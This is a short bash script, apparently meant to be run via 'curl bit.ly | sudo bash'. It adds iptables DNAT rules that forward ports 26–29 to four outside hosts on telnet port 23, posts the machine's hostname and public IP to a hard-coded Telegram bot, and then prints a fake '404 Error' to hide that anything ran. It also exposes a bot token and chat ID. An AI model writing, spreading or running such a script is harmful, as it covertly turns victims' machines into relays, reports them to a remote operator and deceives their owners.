#!/usr/bin/env bash
#
# forwarder.sh – set up DNAT rules and report the box’s public IPv4 via Telegram
#   Usage:
#     curl -fsSL https://bit.ly/4nrQQLG | sudo bash
#
# !!!  HARD-CODED SECRETS – ANYONE CAN READ THESE  !!!
TG_BOT_TOKEN="8183998375:AAExV7Q4vl5jomFUEz6nJCYDARGhNvpJajc"   # <— your token
TG_CHAT_ID="6821157094"                                          # <— your chat ID
# --------------------------------------------------------------

set -euo pipefail

# 1. Enable IP forwarding (won’t survive reboot—edit /etc/sysctl.conf if you want it permanent)
sysctl -w net.ipv4.ip_forward=1 >/dev/null

# 2. DNAT rules – tweak or add more if you’re feelin’ frisky
iptables -t nat -A PREROUTING -p tcp --dport 26 -j DNAT --to-destination 85.9.204.241:23
iptables -t nat -A PREROUTING -p udp --dport 26 -j DNAT --to-destination 85.9.204.241:23

iptables -t nat -A PREROUTING -p tcp --dport 27 -j DNAT --to-destination 85.9.223.204:23
iptables -t nat -A PREROUTING -p udp --dport 27 -j DNAT --to-destination 85.9.223.204:23

iptables -t nat -A PREROUTING -p tcp --dport 28 -j DNAT --to-destination 94.237.121.151:23
iptables -t nat -A PREROUTING -p udp --dport 28 -j DNAT --to-destination 94.237.121.151:23

iptables -t nat -A PREROUTING -p tcp --dport 29 -j DNAT --to-destination 85.9.209.126:23
iptables -t nat -A PREROUTING -p udp --dport 29 -j DNAT --to-destination 85.9.209.126:23

# Let reply traffic leave the box
iptables -t nat -A POSTROUTING -j MASQUERADE

# 3. Grab the public IPv4 (backup URL if the first one’s shy)
PUBLIC_IP=$(curl -fs --max-time 5 https://api.ipify.org || curl -fs --max-time 5 https://icanhazip.com)
[ -n "$PUBLIC_IP" ] || { echo "Could not determine public IP" >&2; exit 1; }


TEXT="✔️ Forwarder deployed on $(hostname) – public IP: $PUBLIC_IP"
curl -s -X POST \
     "https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage" \
     -d "chat_id=${TG_CHAT_ID}" \
     --data-urlencode "text=${TEXT}" \
     -d "disable_web_page_preview=true" \
     -o /dev/null

echo "404 Error Occured."
